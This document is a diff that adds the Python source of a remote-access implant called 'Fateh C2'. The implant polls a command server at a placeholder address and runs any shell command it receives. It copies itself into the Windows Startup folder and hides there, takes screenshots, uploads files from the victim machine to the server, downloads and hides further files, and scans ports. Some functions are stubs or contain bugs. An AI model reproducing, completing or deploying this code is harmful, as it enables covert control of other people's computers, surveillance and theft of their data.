@@ -1,0 +1,302 @@
+# agent metadata
+IP_ADDRESS = "XIP"
+PORT_NUMBER = int("XPORT")
+C2_NAME = "XNAME"
+ADDRESS = f"https://{IP_ADDRESS}:{PORT_NUMBER}/"
+
+
+
+import os
+import re
+import time
+import uuid
+import psutil
+import random
+import getpass
+import socket
+import datetime
+import requests
+import platform
+import pyautogui
+import subprocess
+from datetime import datetime, date
+from threading import Thread
+
+
+class FatehC2:
+
+    def __init__(self):
+        self.agent_ip = IP_ADDRESS
+        self.agent_port = PORT_NUMBER
+        self.agent_name = "XNAME"
+        self.address = ADDRESS
+        self.agent_type = "Fateh C2"
+        self.host_name = f"{socket.gethostname()}"
+        self.agent_path = f"FatehC2 ({self.agent_name}) @ {__file__}"
+        self.is_windows = False
+        self.is_in_startup = False
+        self.current_user = getpass.getuser()
+        self.time_to_reconnect = random.randint(0, 5)
+        self.download_path = self.get_download_path()
+
+
+    def get_download_path(self):
+        if "windows" in platform.platform().lower():
+            self.is_windows = True
+            return r"C:\Users\Public\Pictures"
+        else:
+            self.is_windows = False
+            return f"/home/{self.current_user}"
+
+
+    def windows_auto_run(self):
+        STARTUP_PATH = r"C:\Users\{0}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup".format(self.current_user)
+        file_name = os.path.basename(__file__)
+        file_in_startup = os.path.join(STARTUP_PATH, file_name)
+        if os.path.exists(file_in_startup):
+            self.encrypted_poster(f"[+] Shell is Already @ [{STARTUP_PATH}]")
+        else:
+            try:
+                # read the currant file content
+                with open(__file__,"rb") as file:
+                    content = file.read()
+                # write the file in the startup directory
+                with open(file_in_startup,"wb") as final:
+                    final.write(content)
+                if os.path.exists(file_in_startup):
+                    # change directory to the startup directory
+                    os.chdir(STARTUP_PATH)
+                    # hide the shell hide
+                    os.system(f'attrib +h "{file_name}"') 
+            except Exception as error:
+                pass
+            self.encrypted_poster(f"[+] Shell is hidding @[{STARTUP_PATH}]",
+                                  f"[-] Error msg:\n{str(error)}")
+
+
+    def kill(self) -> None:
+        os.chdir(os.path.dirname(self.agent_path))
+        self.cmd(f"del {0}".format(os.path.basename(self.agent_path)))
+        exit(0)
+
+
+    # TODO: need some reworks to meet basic nmap scans
+    def port_scanner(self, ip_address, ports):
+
+        socket_obj = socket.socket()
+        self.result = f"""
+        [+] Starting port scanneing at < {datetime.now()} >
+        [+] Target address: {ip_address} scanning for [{ports}] Ports\n
+        """
+
+        if ports == "-p-": # Scan for all ports
+            for port_num in range(1, 65353):
+                if socket_obj.connect_ex((str(ip_address), port_num)) == 0:
+                    self.result += f"[+] Port {port_num} is Open\n"
+                else:
+                    pass
+        
+        try: # Scan for spesific port numebr
+            for port in ports.split(","):
+                if socket_obj.connect_ex((str(ip_address), int(port))) == 0:
+                    self.result += f"[+] Port {port_num} is Open\n"
+                else:
+                    self.result += f"[-] Port {port_num} is Closed\n"
+        except Exception as error_message:
+            self.encrypted_poster(f"[-] Error at port scanning function", str(error_message))
+        finally:
+            self.encrypted_poster(f"[+] Scan result:\n {self.result}")
+
+
+    def system_info(self) -> None:
+        sys_info = f"""\n
+        [+] System Info Summary
+        +++++++++++++++++++++++
+        System Type         : {platform.uname().system}
+        Computer Name       : {platform.uname().node}
+        Currant login User  : {self.current_user}
+        System Release      : {platform.uname().release}
+        System Version      : {platform.uname().version}
+        Machine Architectur : {platform.uname().machine}
+        Public IP Address   : {requests.get('https://api.ipify.org').text}
+        MAC Address         : {':'.join(re.findall('..', '%012x' % uuid.getnode()))}
+        Shell Path          : {__file__}
+        Currant Time        : {datetime.now().time()}
+        Boot Time           : {datetime.fromtimestamp(psutil.boot_time())}
+        =======================================================\n"""
+        self.encrypted_poster(sys_info)
+
+
+    def encrypted_poster(self, data2send: str, error_message: str = "") -> None:
+
+        # do some encryption here
+        encrypted_data = ""
+        post_templet = f"""
+        [+] Command STDOUT:\n{encrypted_data}\n
+        <=======================>
+        [-] Command STDERR:\n{error_message}\n
+        """
+        requests.post(url = self.address, data = post_templet)
+
+    
+    def decrypted_getter(self):
+        pass
+
+
+    def load_key(self):
+        pass
+
+
+    def screenshot(self) -> None:
+        os.chdir(self.download_path)
+        my_screenshot = pyautogui.screenshot()
+        now = f" in {date.today().strftime('%d-%m-%y')} at {datetime.now().strftime('%H-%M-%S')}"
+        screen_name = f"client_screen{now}.png"
+        my_screenshot.save(screen_name)
+        if os.path.exists(os.path.join(self.download_path, screen_name)):
+            url = self.address + "/store"        # redirect to the store address @ serevr side
+            files = {'file': open(os.path.join(self.download_path, screen_name), 'rb')}
+            self.encrypted_poster(files)
+        os.remove(screen_name)
+
+
+    def cmd(self, command: str) -> tuple:
+        result = subprocess.Popen(command,
+                                shell=True,
+                                stdin=subprocess.PIPE,
+                                stdout=subprocess.PIPE,
+                                stderr=subprocess.PIPE
+                                )
+        stdout = result.stdout.read().decode()
+        stderr = result.stderr.read().decode()
+        return (stdout, stderr)
+
+
+    def search(self, extension, path) -> None:
+        results = "" # result variable
+        for directory, _, files in os.walk(path):
+            for file in files:
+                if file.endswith(f".{extension}"):
+                    results += f"\n{os.path.join(directory, file)}"
+        if results:
+            self.encrypted_poster(f"Final Result:\n{results}")
+        else:
+            self.encrypted_poster(f"Final Result:\n[-] No {extension}@{path} Directory!")
+
+
+    def download(self, file_name, url): # getting files from server url
+        
+        try:
+            os.chdir(self.download_path)
+            download_command = ""
+            if self.is_windows:
+                # download file from url
+                download_command = f"curl.exe --output {file_name} --url {str(url)}"
+            else:
+                download_command = f"curl {str(url)} --output {file_name}"
+
+            c_out, c_err = self.cmd(download_command)
+            while True:
+                # check if the file downloaded
+                if os.path.exists(os.path.join(self.download_path, file_name)):
+                    self.cmd(f"attrib +h {file_name}")
+                    self.encrypted_poster(c_out, c_err)
+                    break
+                else:
+                    continue
+    
+        except Exception as error:
+            pass
+        self.encrypted_poster(
+            f"[+] {file_name} was downloaded successfully! @ {self.download_path}", 
+            f"Error in download function\n{error}\n"
+        )
+
+
+
+def main():
+
+    shell_options = [
+        "auto_run", "get", "cd", "download",
+        "kill", "list_software","find", "system_info",
+        "snapshot", "cd", "send", "terminate"
+        ]
+
+    my_c2 = FatehC2() # Getting our C2 object
+
+    while True:
+        try:
+            # reading commands from server
+            encrypted_command = requests.get(my_c2.address)
+            encrypted_command = encrypted_command.text
+            # get the plain text command
+            command = my_c2.decrypted_getter(encrypted_command)
+
+            if command.split(" ")[0] in shell_options:
+
+                # Navigation system
+                if command.split(" ")[0] == "cd":
+                    path = command[3::]
+                    if os.path.isdir(path):
+                        os.chdir(path)
+                        my_c2.encrypted_poster(f"CWD: {os.getcwd()}")
+                    else:
+                        my_c2.encrypted_poster("Invalid Path")
+
+                # Auto Run function calling
+                elif command.split(" ")[0] == "auto_run":
+                    if my_c2.is_windows:
+                        my_c2.windows_auto_run()
+                    else:
+                        my_c2.encrypted_poster("Not a Windows machine")
+
+                # send to server
+                elif command.split(" ")[0] == "get":
+                    _, path = command[0:3], command[4::]
+                    if os.path.exists(path):
+                        # redirect to the store file @ serevr side
+                        url = ADDRESS + "/store"
+                        files = {'file': open(path, 'rb')}
+                        requests.post(my_c2.address, files = files)
+                    else:
+                        my_c2.encrypted_poster("Unable to find the file!")
+
+                # download from server
+                elif command.split(" ")[0] == "send":
+                    _, addr = command[0:4], command[5::]
+                    file_name, url = addr.split("@")
+                    my_c2.download(file_name, url)
+
+                # Taking screenshot from target machine.
+                elif command == "screenshot":
+                    my_c2.screenshot()
+
+                # search command
+                elif command.split(" ")[0] == "search":
+                    command = command[7:]                   # delete search keyword
+                    extension, path = command.split("@")    # split the command for extension and path
+                    requests.post(url = ADDRESS, data = f"[+] Searching for {extension} at {path}. . .\n")
+                    my_c2.search(extension, path)
+
+                # getting system info
+                elif command.split(" ")[0] == "system_info":
+                    my_c2.system_info()
+
+                # killing the shell.
+                elif command.split(" ")[0] == "kill":
+                    my_c2.kill()
+
+                elif command.split(" ")[0] == "terminate":
+                    exit()
+
+            else:
+                c_output, c_error = my_c2.cmd(command)
+                my_c2.encrypted_poster(c_output, c_error)
+
+        except:
+            time.sleep(my_c2.time_to_reconnect)
+
+
+if __name__== "__main__":
+    while True:
+        main()
